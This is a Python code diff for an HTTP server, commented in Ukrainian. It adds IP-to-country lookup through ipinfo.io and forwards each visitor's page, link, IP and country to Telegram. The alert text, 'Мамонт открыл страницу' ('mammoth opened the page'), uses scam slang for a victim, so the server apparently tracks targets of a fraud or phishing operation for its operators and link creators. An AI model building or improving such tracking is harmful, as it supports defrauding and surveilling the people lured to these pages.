@@ -166,19 +166,41 @@ def log_function(func):
             raise
     return wrapper
 
+def get_country_by_ip(ip):
+    """Отримує країну за IP адресою"""
+    try:
+        print(f"[DEBUG] Getting country for IP: {ip}")
+        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
+        if resp.status_code == 200:
+            data = resp.json()
+            country_code = data.get("country", "")
+            print(f"[DEBUG] IPinfo response for {ip}: {data}")
+            print(f"[DEBUG] Country code: {country_code}")
+            
+            # Перетворюємо код країни на повну назву
+            country_full = COUNTRY_NAMES.get(country_code, country_code)
+            print(f"[DEBUG] Country full name: {country_code} -> {country_full}")
+            return country_full
+        else:
+            print(f"[DEBUG] IPinfo error for {ip}: status {resp.status_code}")
+            return "Unknown"
+    except Exception as e:
+        print(f"[DEBUG] Error getting country for {ip}: {e}")
+        return "Unknown"
+
 @log_function
 def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
-    # Визначаємо країну за IP, якщо не передано
+    print(f"[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
+    
+    # Якщо країна не передана, використовуємо "Unknown"
     if not country:
-        try:
-            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=1)
-            if resp.status_code == 200:
-                data = resp.json()
-                country = data.get("country", "")
-        except Exception:
-            country = ""
-    # Перетворюємо код країни на повну назву
+        country = "Unknown"
+        print(f"[DEBUG] No country provided, using: {country}")
+    
+    # Перетворюємо код країни на повну назву (якщо це код)
     country_full = COUNTRY_NAMES.get(country, country)
+    print(f"[DEBUG] Final country: '{country}' -> '{country_full}'")
+    
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
@@ -350,13 +372,18 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             ip = get_real_ip(self)
             print(f"📝 Запит: {orig_path} від IP: {ip}")
             
+            # Отримуємо країну за IP
+            country = get_country_by_ip(ip)
+            print(f"🌍 Країна для IP {ip}: {country}")
+            
             # Логуємо всі запити на сторінки (не ресурси)
             if not any(ext in orig_path for ext in skip_ext) and not any(d in orig_path for d in skip_dirs):
                 print(f"📤 Відправляємо лог для: {orig_path}")
                 send_telegram_log_async(
                     page=orig_path,
                     link=self.path,
-                    ip=ip
+                    ip=ip,
+                    country=country
                 )
         else:
             print(f"🚫 Telegram запит - не логуємо: {orig_path}")
@@ -425,11 +452,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         if extra_user_id and not is_telegram:
             print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path} (user_id: {extra_user_id})")
+            # Отримуємо країну за IP
+            country = get_country_by_ip(ip)
+            print(f"🌍 Країна для event creator: {country}")
             # Non-blocking log
             send_telegram_log_async(
                 page=norm_path,
                 link=self.path,
                 ip=ip,
+                country=country,
                 extra_user_id=extra_user_id
             )
         elif is_telegram:
@@ -444,11 +475,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             if norm_path not in self.server.logged_paths:
                 self.server.logged_paths.add(norm_path)
                 print(f"📝 Логуємо відкриття сторінки в групу: {norm_path}")
+                # Отримуємо країну за IP
+                country = get_country_by_ip(ip)
+                print(f"🌍 Країна для групи: {country}")
                 # Non-blocking log
                 send_telegram_log_async(
                     page=norm_path,
                     link=self.path,
-                    ip=ip
+                    ip=ip,
+                    country=country
                 )
             else:
                 print(f"ℹ️ Сторінка вже залогована: {norm_path}")
